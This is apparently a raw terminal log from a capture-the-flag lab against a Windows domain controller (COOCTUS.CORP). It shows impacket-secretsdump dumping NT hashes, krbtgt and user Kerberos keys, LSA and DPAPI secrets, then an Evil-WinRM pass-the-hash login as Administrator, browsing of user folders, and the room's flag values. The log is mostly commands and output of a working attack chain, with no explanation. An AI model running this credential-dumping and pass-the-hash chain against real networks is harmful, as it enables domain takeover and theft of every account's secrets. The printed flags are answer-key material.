+cryptsetup-nuke-password/  kernel-img.conf            plymouth/                  sysstat/
+crypttab                   keyutils/                  polkit-1/                  systemd/
+cupshelpers/               kismet/                    postgresql/                terminfo/
+dbus-1/                    krb5.conf                  postgresql-common/         texmf/
+dconf/                     ldap/                      powershell-empire/         theHarvester/
+debconf.conf               ld.so.cache                ppp/                       tightvncserver.conf
+debian_version             ld.so.conf                 profile                    timidity/
+debuginfod/                ld.so.conf.d/              profile.d/                 tmpfiles.d/
+default/                   legion.conf                protocols                  tpm2-tss/
+deluser.conf               libao.conf                 proxychains4.conf          ts.conf
+depmod.d/                  libaudit.conf              pulse/                     ucf.conf
+dhcp/                      libblockdev/               python2.7/                 udev/
+dhcpcd.conf                libccid_Info.plist         python3/                   udisks2/
+dictionaries-common/       libnl-3/                   python3.13/                ufw/
+dirsearch/                 libpaper.d/                radcli/                    unicornscan/
+doc-base/                  lightdm/                   rc0.d/                     updatedb.conf
+dpkg/                      lighttpd/                  rc1.d/                     update-motd.d/
+e2scrub.conf               locale.conf                rc2.d/                     UPower/
+eac/                       locale.gen                 rc3.d/                     usb_modeswitch.conf
+emacs/                     localtime@                 rc4.d/                     usb_modeswitch.d/
+environment                logcheck/                  rc5.d/                     vconsole.conf@
+environment.d/             login.defs                 rc6.d/                     vdpau_wrapper.cfg
+ethertypes                 logrotate.conf             rcS.d/                     vim/
+ettercap/                  logrotate.d/               reader.conf.d/             vmware-tools/
+firebird/                  macchanger/                rearj.cfg                  vpnc/
+firefox-esr/               machine-id                 redis/                     vulkan/
+fonts/                     magic                      redsocks.conf              wgetrc
+freetds/                   magic.mime                 request-key.conf           wireshark/
+fstab                      manpath.config             request-key.d/             wpa_supplicant/
+fuse.conf                  matplotlibrc               resolv.conf                X11/
+fwupd/                     mime.types                 responder/                 xattr.conf
+gai.conf                   minicom/                   rmt@                       xdg/
+gdb/                       miredo/                    rpc                        xemacs21/
+geoclue/                   miredo.conf                runit/                     xfce4/
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali.kali       kali
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+10.49.136.50 jack.thm
+10.49.138.249 DC.COOCTUS.CORP COOCTUS.CORP COOCTUS.CORP0 target.thm
+
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-secretsdump -no-pass -k -just-dc-user Administrator DC.COOCTUS.CORP
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:129d7f8a246f585fadc6fe095403b31b606a940f726af22d675986fc582580c4
+Administrator:aes128-cts-hmac-sha1-96:2947439c5d02b9a7433358ffce3c4c11
+Administrator:des-cbc-md5:5243234aef9d0e83
+[*] Cleaning up...
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-secretsdump -no-pass -k DC.COOCTUS.CORP
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+COOCTUS\DC$:plain_password_hex:1f509ac9d8adcf011840bb378622d70fc0ac2ffa49260c4008f195bc6b0a2eafb6091f603c54003c3e3fd514a1ea357575e6d03633ba030d73ea289b7215a6a610c544e8aeb3c0888e594f692f23ec595c8493ffd58586ef0261414941fbb2ae6610b544a28ea3d5a6dff5a736b463cee075e632630075069dfacb175eff9fb812c3e0d980c6972bb680cf62afd6707a308241fb845d0d804ec63d481435c34f4f7fd4dad339c163e6d8d90d82b517d7ef2eca59296379e08c19dfee508104e6a75a914573a6ae2dbc3bbae7f9b8bed46f1cdb45dcaedc1addcb61b60b8deb1de1616dedf0352b70084e6c5c053472a4
+COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:fea6306d9eff962910dc9b34f389ff41:::
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
+dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
+[*] NL$KM
+ 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
+ 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
+ 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
+ 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
+NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747ddec61b924977ab42538797e:::
+COOCTUS.CORP\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:872a35060824b0e61912cb2e9e97bbb1:::
+COOCTUS.CORP\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90dcab62cc0658120848244ef:::
+COOCTUS.CORP\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099a7c8eaecb42b3d73cc9b7:::
+COOCTUS.CORP\Spooks:1117:aad3b435b51404eeaad3b435b51404ee:07148bf4dacd80f63ef09a0af64fbaf9:::
+COOCTUS.CORP\Steve:1119:aad3b435b51404eeaad3b435b51404ee:2ae85453d7d606ec715ef2552e16e9b0:::
+COOCTUS.CORP\Howard:1120:aad3b435b51404eeaad3b435b51404ee:65340e6e2e459eea55ae539f0ec9def4:::
+COOCTUS.CORP\admCroccCrew:1121:aad3b435b51404eeaad3b435b51404ee:0e2522b2d7b9fd08190a7f4ece342d8a:::
+COOCTUS.CORP\Fawaz:1122:aad3b435b51404eeaad3b435b51404ee:d342c532bc9e11fc975a1e7fbc31ed8c:::
+COOCTUS.CORP\karen:1123:aad3b435b51404eeaad3b435b51404ee:e5810f3c99ae2abb2232ed8458a61309:::
+COOCTUS.CORP\cryillic:1124:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
+COOCTUS.CORP\yumeko:1125:aad3b435b51404eeaad3b435b51404ee:c0e0e39ac7cab8c57c3543c04c340b49:::
+COOCTUS.CORP\pars:1126:aad3b435b51404eeaad3b435b51404ee:fad642fb63dcc57a24c71bdc47e55a05:::
+COOCTUS.CORP\kevin:1127:aad3b435b51404eeaad3b435b51404ee:48de70d96bf7b6874ec195cd5d389a09:::
+COOCTUS.CORP\jon:1128:aad3b435b51404eeaad3b435b51404ee:7f828aaed37d032d7305d6d5016ccbb3:::
+COOCTUS.CORP\Varg:1129:aad3b435b51404eeaad3b435b51404ee:7da62b00d4b258a03708b3c189b41a7e:::
+COOCTUS.CORP\evan:1130:aad3b435b51404eeaad3b435b51404ee:8c4b625853d78e84fb8b3c4bcd2328c5:::
+COOCTUS.CORP\Ben:1131:aad3b435b51404eeaad3b435b51404ee:1ce6fec89649608d974d51a4d6066f12:::
+COOCTUS.CORP\David:1132:aad3b435b51404eeaad3b435b51404ee:f863e27063f2ccfb71914b300f69186a:::
+COOCTUS.CORP\password-reset:1134:aad3b435b51404eeaad3b435b51404ee:0fed9c9dc78da2c6f37f885ee115585c:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:fea6306d9eff962910dc9b34f389ff41:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:129d7f8a246f585fadc6fe095403b31b606a940f726af22d675986fc582580c4
+Administrator:aes128-cts-hmac-sha1-96:2947439c5d02b9a7433358ffce3c4c11
+Administrator:des-cbc-md5:5243234aef9d0e83
+krbtgt:aes256-cts-hmac-sha1-96:25776b9622e67e69a5aee9cf532aa6ffec9318ba780e2f5c966c0519d5958f1e
+krbtgt:aes128-cts-hmac-sha1-96:69988d411f292b02157b8fc1b539bd98
+krbtgt:des-cbc-md5:d9eff2048f2f3e46
+COOCTUS.CORP\Visitor:aes256-cts-hmac-sha1-96:e107d748348260a625b7635855f0f403731a06837f2875bec8e15b4be9e017c3
+COOCTUS.CORP\Visitor:aes128-cts-hmac-sha1-96:d387522d6ce2698ddde8c0f5126eca90
+COOCTUS.CORP\Visitor:des-cbc-md5:a8023e2c04e910fb
+COOCTUS.CORP\mark:aes256-cts-hmac-sha1-96:ee0949690f31a22898f0808386aa276b2303f82a6b06da39b9735da1b5fc4c8d
+COOCTUS.CORP\mark:aes128-cts-hmac-sha1-96:ce5df3dfb717b5649ef59e9d8d028c78
+COOCTUS.CORP\mark:des-cbc-md5:83da7acd5b85c2f1
+COOCTUS.CORP\Jeff:aes256-cts-hmac-sha1-96:c57c7d8f9011d0f11633ae83a2db2af53af09d47a9c27fc05e8a932686254ef0
+COOCTUS.CORP\Jeff:aes128-cts-hmac-sha1-96:e95538a0752f71a2e615e88fbf3f9151
+COOCTUS.CORP\Jeff:des-cbc-md5:4c318a40a792feb0
+COOCTUS.CORP\Spooks:aes256-cts-hmac-sha1-96:c70088aaeae0b4fbaf129e3002b4e99536fa97404da96c027626dcfcd4509800
+COOCTUS.CORP\Spooks:aes128-cts-hmac-sha1-96:7f95dc2d8423f0607851a27c46e3ba0d
+COOCTUS.CORP\Spooks:des-cbc-md5:0231349bcd549b97
+COOCTUS.CORP\Steve:aes256-cts-hmac-sha1-96:48edbdf191165403dca8103522bc953043f0cd2674f103069c1012dc069e6fd2
+COOCTUS.CORP\Steve:aes128-cts-hmac-sha1-96:6f3a688e3d88d44c764253470cf95d0c
+COOCTUS.CORP\Steve:des-cbc-md5:0d54b320cba7627a
+COOCTUS.CORP\Howard:aes256-cts-hmac-sha1-96:6ea6db6a4d5042326f93037d4ec4284d6bbd4d79a6f9b07782aaf4257baa13f8
+COOCTUS.CORP\Howard:aes128-cts-hmac-sha1-96:6926ab9f1a65d7380de82b2d29a55537
+COOCTUS.CORP\Howard:des-cbc-md5:9275c8ba40a16b86
+COOCTUS.CORP\admCroccCrew:aes256-cts-hmac-sha1-96:3fb5b3d1bdfc4aff33004420046c94652cba6b70fd9868ace49d073170ec7db1
+COOCTUS.CORP\admCroccCrew:aes128-cts-hmac-sha1-96:19894057a5a47e1b6991c62009b8ded4
+COOCTUS.CORP\admCroccCrew:des-cbc-md5:ada854ce919d2c75
+COOCTUS.CORP\Fawaz:aes256-cts-hmac-sha1-96:4f2b258698908a6dbac21188a42429ac7d89f5c7e86dcf48df838b2579b262bc
+COOCTUS.CORP\Fawaz:aes128-cts-hmac-sha1-96:05d26514fe5a64e76484e5cf84c420c1
+COOCTUS.CORP\Fawaz:des-cbc-md5:a7d525e501ef1fbc
+COOCTUS.CORP\karen:aes256-cts-hmac-sha1-96:dc423de7c5e44e8429203ca226efed450ed3d25d6d92141853d22fee85fddef0
+COOCTUS.CORP\karen:aes128-cts-hmac-sha1-96:6e66c00109942e45588c448ddbdd005d
+COOCTUS.CORP\karen:des-cbc-md5:a27cf23eaba4708a
+COOCTUS.CORP\cryillic:aes256-cts-hmac-sha1-96:f48f9f9020cf318fff80220a15fea6eaf4a163892dd06fd5d4e0108887afdabc
+COOCTUS.CORP\cryillic:aes128-cts-hmac-sha1-96:0b8dd6f24f87a420e71b4a649cd28a39
+COOCTUS.CORP\cryillic:des-cbc-md5:6d92892ab9c74a31
+COOCTUS.CORP\yumeko:aes256-cts-hmac-sha1-96:7c3bd36a50b8f0b880a1a756f8f2495c14355eb4ab196a337c977254d9dfd992
+COOCTUS.CORP\yumeko:aes128-cts-hmac-sha1-96:0d33127da1aa3f71fba64525db4ffe7e
+COOCTUS.CORP\yumeko:des-cbc-md5:8f404a1a97e0435e
+COOCTUS.CORP\pars:aes256-cts-hmac-sha1-96:0c72d5f59bc70069b5e23ff0b9074caf6f147d365925646c33dd9e649349db86
+COOCTUS.CORP\pars:aes128-cts-hmac-sha1-96:79314ceefa18e30a02627761bb8dfee9
+COOCTUS.CORP\pars:des-cbc-md5:15d552643220868a
+COOCTUS.CORP\kevin:aes256-cts-hmac-sha1-96:9982245b622b09c28c77adc34e563cd30cb00d159c39ecc7bc0f0a8857bcc065
+COOCTUS.CORP\kevin:aes128-cts-hmac-sha1-96:51cc7562d3de39f345b68e6923725a6a
+COOCTUS.CORP\kevin:des-cbc-md5:89201a58e33ed9ba
+COOCTUS.CORP\jon:aes256-cts-hmac-sha1-96:9fa5e82157466b813a7b05c311a25fd776182a1c6c9e20d15330a291c3e961e5
+COOCTUS.CORP\jon:aes128-cts-hmac-sha1-96:a6202c53070db2e3b5327cef1bb6be86
+COOCTUS.CORP\jon:des-cbc-md5:0dabe370ab64f407
+COOCTUS.CORP\Varg:aes256-cts-hmac-sha1-96:e85d21b0c9c41eb7650f4af9129e10a83144200c4ad73271a31d8cd2525bdf45
+COOCTUS.CORP\Varg:aes128-cts-hmac-sha1-96:afd9fe7026c127d2b6e84715f3fcc879
+COOCTUS.CORP\Varg:des-cbc-md5:8cb92637260eb5c4
+COOCTUS.CORP\evan:aes256-cts-hmac-sha1-96:d8f0a955ae809ce3ac33b517e449a70e0ab2f34deac0598abc56b6d48347cdc3
+COOCTUS.CORP\evan:aes128-cts-hmac-sha1-96:c67fc5dcd5a750fe0f22ad63ffe3698b
+COOCTUS.CORP\evan:des-cbc-md5:c246c7f152d92949
+COOCTUS.CORP\Ben:aes256-cts-hmac-sha1-96:1645867acea74aecc59ebf08d7e4d98a09488898bbf00f33dbc5dd2c8326c386
+COOCTUS.CORP\Ben:aes128-cts-hmac-sha1-96:59774a99d18f215d34ea1f33a27bf1fe
+COOCTUS.CORP\Ben:des-cbc-md5:801c51ea8546b55d
+COOCTUS.CORP\David:aes256-cts-hmac-sha1-96:be42bf5c3aa5161f7cf3f8fce60613fc08cee0c487f5a681b1eeb910bf079c74
+COOCTUS.CORP\David:aes128-cts-hmac-sha1-96:6b17ec1654837569252f31fec0263522
+COOCTUS.CORP\David:des-cbc-md5:e5ba4f34cd5b6dae
+COOCTUS.CORP\password-reset:aes256-cts-hmac-sha1-96:cdcbd00a27dcf5e46691aac9e51657f31d7995c258ec94057774d6e011f58ecb
+COOCTUS.CORP\password-reset:aes128-cts-hmac-sha1-96:bb66b50c126becf82f691dfdb5891987
+COOCTUS.CORP\password-reset:des-cbc-md5:343d2c5e01b5a74f
+DC$:aes256-cts-hmac-sha1-96:90f88dec9ca4d3dbb0b019fa28f72c21fa70986fa5520617b19d29ad1e18764c
+DC$:aes128-cts-hmac-sha1-96:5cb440e7198d9b9bf3fec78f8168362f
+DC$:des-cbc-md5:045efbe64c102a9e
+[*] Cleaning up...
+[*] Stopping service RemoteRegistry
+[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
+[*] Cleaning up...
+[*] Stopping service RemoteRegistry
+Exception ignored in: <function Registry.__del__ at 0x7f09c6bb4ea0>
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 172, in __del__
+  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 169, in close
+  File "/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py", line 409, in close
+  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 633, in closeFile
+  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1357, in close
+  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 474, in sendSMB
+  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 443, in signSMB
+  File "/usr/lib/python3/dist-packages/impacket/crypto.py", line 150, in AES_CMAC
+  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
+KeyError: 'Cryptodome.Cipher.AES'
+Exception ignored in: <function Registry.__del__ at 0x7f09c6bb4ea0>
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 172, in __del__
+  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 169, in close
+  File "/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py", line 409, in close
+  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 633, in closeFile
+  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1357, in close
+  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 474, in sendSMB
+  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 443, in signSMB
+  File "/usr/lib/python3/dist-packages/impacket/crypto.py", line 150, in AES_CMAC
+  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
+KeyError: 'Cryptodome.Cipher.AES'
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ evil-winrm -u Administrator -H add41095f1fb0405b32f70a489de022d -i target.thm
+
+Evil-WinRM shell v3.9
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
+*Evil-WinRM* PS C:\Users\Administrator\Documents> pwd
+
+Path
+----
+C:\Users\Administrator\Documents
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+DC
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\
+*Evil-WinRM* PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/7/2021   7:30 PM                Background
+d-----         6/7/2021   5:30 PM                inetpub
+d-----         6/7/2021  10:53 PM                PerfLogs
+d-r---         6/8/2021   3:44 PM                Program Files
+d-----         6/7/2021   5:25 PM                Program Files (x86)
+d-----         6/7/2021   8:05 PM                Shares
+d-r---         6/8/2021  11:54 AM                Users
+d-----         6/8/2021   3:50 PM                Windows
+
+
+*Evil-WinRM* PS C:\> cd Users
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/7/2021  10:23 PM                admcrocccrew
+d-----         6/8/2021   3:06 PM                Administrator
+d-----         6/8/2021  11:54 AM                Fawaz
+d-r---         6/7/2021   5:25 PM                Public
+d-----         6/7/2021   6:27 PM                Spooks
+d-----         6/7/2021   8:12 PM                Spooks.COOCTUS
+
+
+*Evil-WinRM* PS C:\Users> cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator> ls
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/7/2021  10:55 PM                3D Objects
+d-r---         6/7/2021  10:55 PM                Contacts
+d-r---         6/7/2021  10:55 PM                Desktop
+d-r---         6/7/2021  10:55 PM                Documents
+d-r---         6/7/2021  10:55 PM                Downloads
+d-r---         6/7/2021  10:55 PM                Favorites
+d-r---         6/7/2021  10:55 PM                Links
+d-r---         6/7/2021  10:55 PM                Music
+d-r---         6/7/2021  10:55 PM                Pictures
+d-r---         6/7/2021  10:55 PM                Saved Games
+d-r---         6/7/2021  10:55 PM                Searches
+d-r---         6/7/2021  10:55 PM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> ls -al
+A parameter cannot be found that matches parameter name 'al'.
+At line:1 char:4
++ ls -al
++    ~~~
+    + CategoryInfo          : InvalidArgument: (:) [Get-ChildItem], ParameterBindingException
+    + FullyQualifiedErrorId : NamedParameterNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\Users\Administrator> ls -a
+Parameter cannot be processed because the parameter name 'a' is ambiguous. Possible matches include: -Attributes -Directory -File -Hidden -ReadOnly -System.
+At line:1 char:4
++ ls -a
++    ~~
+    + CategoryInfo          : InvalidArgument: (:) [Get-ChildItem], ParameterBindingException
+    + FullyQualifiedErrorId : AmbiguousParameter,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\Users\Administrator> ls -Force
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/7/2021  10:55 PM                3D Objects
+d--h--         6/7/2021   5:25 PM                AppData
+d--hsl         6/7/2021   5:25 PM                Application Data
+d-r---         6/7/2021  10:55 PM                Contacts
+d--hsl         6/7/2021   5:25 PM                Cookies
+d-r---         6/7/2021  10:55 PM                Desktop
+d-r---         6/7/2021  10:55 PM                Documents
+d-r---         6/7/2021  10:55 PM                Downloads
+d-r---         6/7/2021  10:55 PM                Favorites
+d-r---         6/7/2021  10:55 PM                Links
+d--hsl         6/7/2021   5:25 PM                Local Settings
+d-r---         6/7/2021  10:55 PM                Music
+d--hsl         6/7/2021   5:25 PM                My Documents
+d--hsl         6/7/2021   5:25 PM                NetHood
+d-r---         6/7/2021  10:55 PM                Pictures
+d--hsl         6/7/2021   5:25 PM                PrintHood
+d--hsl         6/7/2021   5:25 PM                Recent
+d-r---         6/7/2021  10:55 PM                Saved Games
+d-r---         6/7/2021  10:55 PM                Searches
+d--hsl         6/7/2021   5:25 PM                SendTo
+d--hsl         6/7/2021   5:25 PM                Start Menu
+d--hsl         6/7/2021   5:25 PM                Templates
+d-r---         6/7/2021  10:55 PM                Videos
+-a-h--         9/9/2026   9:49 AM         786432 NTUSER.DAT
+-a-hs-         6/7/2021   5:25 PM         126976 ntuser.dat.LOG1
+-a-hs-         6/7/2021   5:25 PM         196608 ntuser.dat.LOG2
+-a-hs-         6/7/2021   5:31 PM          65536 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
+-a-hs-         6/7/2021   5:25 PM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
+-a-hs-         6/7/2021   5:25 PM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
+---hs-         6/7/2021   5:25 PM             20 ntuser.ini
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd ..
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/7/2021  10:23 PM                admcrocccrew
+d-----         6/8/2021   3:06 PM                Administrator
+d-----         6/8/2021  11:54 AM                Fawaz
+d-r---         6/7/2021   5:25 PM                Public
+d-----         6/7/2021   6:27 PM                Spooks
+d-----         6/7/2021   8:12 PM                Spooks.COOCTUS
+
+
+*Evil-WinRM* PS C:\Users> cd admcroccrew
+Cannot find path 'C:\Users\admcroccrew' because it does not exist.
+At line:1 char:1
++ cd admcroccrew
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\admcroccrew:String) [Set-Location], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+*Evil-WinRM* PS C:\Users> cd admcrocccrew
+*Evil-WinRM* PS C:\Users\admcrocccrew> ls -Force
+
+
+    Directory: C:\Users\admcrocccrew
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/7/2021  10:23 PM                3D Objects
+d--h--         6/7/2021  10:23 PM                AppData
+d--hsl         6/7/2021  10:23 PM                Application Data
+d-r---         6/7/2021  10:23 PM                Contacts
+d--hsl         6/7/2021  10:23 PM                Cookies
+d-r---         6/7/2021  10:23 PM                Desktop
+d-r---         6/7/2021  10:23 PM                Documents
+d-r---         6/7/2021  10:23 PM                Downloads
+d-r---         6/7/2021  10:23 PM                Favorites
+d-r---         6/7/2021  10:23 PM                Links
+d--hsl         6/7/2021  10:23 PM                Local Settings
+d-r---         6/7/2021  10:23 PM                Music
+d--hsl         6/7/2021  10:23 PM                My Documents
+d--hsl         6/7/2021  10:23 PM                NetHood
+d-r---         6/7/2021  10:23 PM                Pictures
+d--hsl         6/7/2021  10:23 PM                PrintHood
+d--hsl         6/7/2021  10:23 PM                Recent
+d-r---         6/7/2021  10:23 PM                Saved Games
+d-r---         6/7/2021  10:23 PM                Searches
+d--hsl         6/7/2021  10:23 PM                SendTo
+d--hsl         6/7/2021  10:23 PM                Start Menu
+d--hsl         6/7/2021  10:23 PM                Templates
+d-r---         6/7/2021  10:23 PM                Videos
+-a-h--         9/9/2026   9:49 AM         524288 NTUSER.DAT
+-a-hs-         6/7/2021  10:23 PM              0 ntuser.dat.LOG1
+-a-hs-         6/7/2021  10:23 PM              0 ntuser.dat.LOG2
+-a-hs-         6/7/2021  10:25 PM          65536 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
+-a-hs-         6/7/2021  10:23 PM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
+-a-hs-         6/7/2021  10:23 PM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
+-a-hs-         6/7/2021  10:23 PM             20 ntuser.ini
+
+
+*Evil-WinRM* PS C:\Users\admcrocccrew> cd ../..
+*Evil-WinRM* PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/7/2021   7:30 PM                Background
+d-----         6/7/2021   5:30 PM                inetpub
+d-----         6/7/2021  10:53 PM                PerfLogs
+d-r---         6/8/2021   3:44 PM                Program Files
+d-----         6/7/2021   5:25 PM                Program Files (x86)
+d-----         6/7/2021   8:05 PM                Shares
+d-r---         6/8/2021  11:54 AM                Users
+d-----         6/8/2021   3:50 PM                Windows
+
+
+*Evil-WinRM* PS C:\> cd Shares
+*Evil-WinRM* PS C:\Shares> ls
+
+
+    Directory: C:\Shares
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/8/2021  12:42 PM                Home
+
+
+*Evil-WinRM* PS C:\Shares> cd Home
+*Evil-WinRM* PS C:\Shares\Home> ls
+
+
+    Directory: C:\Shares\Home
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/8/2021  12:38 PM             28 priv-esc-2.txt
+-a----         6/7/2021   8:08 PM             22 priv-esc.txt
+-a----         6/7/2021   8:14 PM             17 user.txt
+
+
+*Evil-WinRM* PS C:\Shares\Home> type user.txt
+THM{Gu3st_Pl3as3}
+*Evil-WinRM* PS C:\Shares\Home> type priv-esc.txt
+THM{0n-Y0ur-Way-t0-DA}
+*Evil-WinRM* PS C:\Shares\Home> priv-esc.txt-2.txt
+The term 'priv-esc.txt-2.txt' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ priv-esc.txt-2.txt
++ ~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (priv-esc.txt-2.txt:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+*Evil-WinRM* PS C:\Shares\Home> priv-esc.txt
+The term 'priv-esc.txt' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ priv-esc.txt
++ ~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (priv-esc.txt:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+*Evil-WinRM* PS C:\Shares\Home> type priv-esc-2.txt
+THM{Wh4t-t0-d0...Wh4t-t0-d0}
+*Evil-WinRM* PS C:\Shares\Home> Get-ChildItem -Recurce -Filter "root.*"
+A parameter cannot be found that matches parameter name 'Recurce'.
+At line:1 char:15
++ Get-ChildItem -Recurce -Filter "root.*"
++               ~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Get-ChildItem], ParameterBindingException
+    + FullyQualifiedErrorId : NamedParameterNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\Shares\Home> Get-ChildItem -Recurse -Filter "root.*"
+*Evil-WinRM* PS C:\Shares\Home> cd ../..
+*Evil-WinRM* PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/7/2021   7:30 PM                Background
+d-----         6/7/2021   5:30 PM                inetpub
+d-----         6/7/2021  10:53 PM                PerfLogs
+d-r---         6/8/2021   3:44 PM                Program Files
+d-----         6/7/2021   5:25 PM                Program Files (x86)
